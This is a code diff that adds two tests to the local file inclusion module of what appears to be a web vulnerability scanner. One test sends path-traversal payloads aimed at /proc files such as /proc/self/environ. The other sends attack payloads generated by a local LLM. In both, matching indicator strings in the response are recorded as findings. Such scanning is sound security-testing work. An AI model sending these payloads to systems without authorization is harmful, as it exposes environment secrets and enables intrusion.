@@ -71,6 +71,50 @@ class LFIModule:
         
         # Test advanced log poisoning
         self._test_log_poisoning_advanced(url, method, param, value)
+        
+        # Test /proc filesystem disclosure
+        self._test_proc_filesystem(url, method, param, value)
+
+        # LLM-generated adaptive LFI payloads
+        self._test_llm_payloads(url, method, param, value)
+
+    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
+        """Test with LLM-generated file inclusion payloads.
+
+        Uses Qwen2.5-7B to produce context-aware LFI payloads when
+        ``--local-llm`` is active.
+        """
+        ai = getattr(self.engine, 'ai', None)
+        if ai is None:
+            return
+        llm_payloads = ai.get_llm_payloads('lfi', param)
+        if not llm_payloads:
+            return
+
+        for payload in llm_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                resp_text = response.text
+                for file_type, indicators in self.file_indicators.items():
+                    indicator_count = sum(1 for ind in indicators if ind in resp_text)
+                    if indicator_count >= 2:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="LFI (AI-generated)",
+                            url=url,
+                            severity='HIGH',
+                            confidence=0.80,
+                            param=param,
+                            payload=payload,
+                            evidence=f"AI payload triggered file content ({file_type})",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
     
     def _test_php_filter_chains(self, url: str, method: str, param: str, value: str):
         """Test PHP filter chains for source disclosure"""
@@ -168,6 +212,36 @@ class LFIModule:
                         return
                 except Exception:
                     continue
+
+    def _test_proc_filesystem(self, url: str, method: str, param: str, value: str):
+        """Test /proc filesystem for information disclosure"""
+        proc_payloads = [
+            ('../../../proc/self/environ', ['PATH=', 'HOME=', 'USER=', 'SHELL=']),
+            ('../../../proc/self/cmdline', ['python', 'apache', 'nginx', 'php', 'node']),
+            ('../../../proc/version', ['Linux version', 'gcc', 'SMP']),
+            ('../../../proc/net/tcp', ['local_address', 'rem_address', 'sl']),
+            ('../../../proc/self/status', ['Name:', 'State:', 'Pid:', 'Uid:']),
+        ]
+        for payload, indicators in proc_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text
+                match_count = sum(1 for ind in indicators if ind in text)
+                if match_count >= 2:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="LFI (Proc Filesystem Disclosure)",
+                        url=url, severity='HIGH', confidence=0.85, param=param,
+                        payload=payload,
+                        evidence=f"Proc file content detected: {payload}",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
 
     def test_url(self, url: str):
         """Test URL for LFI"""
